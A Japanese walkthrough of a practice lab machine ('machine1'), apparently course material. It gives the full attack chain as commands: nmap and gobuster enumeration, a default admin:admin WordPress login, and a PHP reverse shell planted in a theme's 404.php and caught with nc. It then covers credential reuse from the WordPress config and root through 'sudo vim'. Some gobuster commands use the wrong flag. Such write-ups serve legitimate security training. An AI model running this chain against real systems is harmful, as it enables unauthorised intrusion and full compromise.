machine1で学べることは以下のことです。

簡単な認証突破
発見したクレデンシャルの使いまわし
sudoによる権限昇格
おすすめ視聴タイミング: ラボ攻略に取り掛かる前

### 攻略の流れ
#### Enumeration
nmapを用いてportscanを行います。
```
$ nmap machine1
 ```
オープンポートに対してより詳細なスキャンを行います。

-sCオプションではnmapのデフォルトスクリプトを動作させ、-sVオプションではサービスのバージョン情報などを取得します。
```
$ nmap -p22,80 -sC -sV machine1
```  
サービスの調査に移る前に、開いているポートの見落としを避けるためにフルポートスキャンをします。
```
$ nmap -p1-65535 machine1
```
フルポートスキャンには時間がかかることが多いので、スキャンをしながらapacheなどのサービスを調査します。

ブラウザでアクセスするとapacheのデフォルトページが表示され、ソースコードなどにも特に情報がないためgobusterを使ってディレクトリを列挙します。
```
$ gobuster dir -u http://machine1 -u /usr/share/wordlists/dirb/common.txt
```
wordpressというディレクトリが見つかったのでアクセスすると、wordpressで作成されたページが表示されます。

さらにgobusterを使ってディレクトリを列挙するとwordpressに関連するディレクトリがいくつか見つかります。
```
 $ gobuster dir -u http://machine1/wordpress -u /usr/share/wordlists/dirb/common.txt
 ```
wp-adminには一般的に管理者用のログインページが用意されているのでアクセスしてみると、ログイン画面が表示されます。

Initial Shell
管理者のパスワードは基本的に複雑なものになっていますが、内部のみに公開されているサービスなどのパスワードは簡単になっていることがあります。

`admin:admin`や`root:root`などでログインできないか検証すると、admin:adminでログインできました。

wordpressの管理者としてログインすることができたため、ページを改ざんしてリバースシェルを取得します。

コマンドではkali内部に保存されているウェブシェルをcatコマンドで出力し、xclipコマンドでクリップボードにいれています。
```
 $ cat /usr/share/webshells/php/php-reverse-shell.php | xclip -selection c
```  
ipアドレスとポート番号を変更したあと保存し、ncコマンドでリバースシェルを待ち受けてから改ざんしたページにアクセスします。

今回使用したテーマがtwenty-twentyで、ページは404.phpであるため、アクセスするurlは
```
http://machine1/wordpress/wp-content/themes/twenty-twenty/404.php
```
となります。

また、ncコマンドでシェルを待ち受ける際のコマンドは以下になります。
```
$ nc -lvnp 443
```
### Enumeration(権限昇格)
取得したリバースシェルは使い勝手が悪い(矢印キーが効かない、タブ補完してくれないなど)ため、シェルのアップグレードを行います。   
```
$ python3 -c 'import pty;pty.spawn("/bin/bash")'   
(Ctrl+z)    
$ stty raw -echo;fg   
(Enter)   
(Enter)   
$ export TERM=xterm   
```
ウェブアプリがデータベースを利用している場合、設定ファイルにデータベースユーザのユーザ名とパスワードが書き込まれている可能性があります。

wordpressの設定ファイルを調査するとconfig.phpというファイルが見つかり、その中からパスワードが見つかります。

パスワードは使いまわされていることがあるため、このパスワードを使って他のユーザに権限昇格できることがあります。

マシン上のユーザを列挙するため、/etc/passwdを確認します。
```
$ cat /etc/passwd
```  
developerというユーザが見つかったので、先ほどのパスワードを利用して権限昇格できないか確認します。

ユーザの変更はsuコマンドを使います。
```
$ su - developer
```
Privilege Escalation
一般ユーザにはsudoを用いてroot権限で実行できるコマンドがある場合があります。

developerがroot権限で実行できるアプリを列挙するためsudoコマンドを使います。
```
$ sudo -l
```
vimを使って権限昇格する方法を検索し、見つかった手法を実行するとrootになることができます。
```
$ sudo vim -c ':!/bin/sh'
```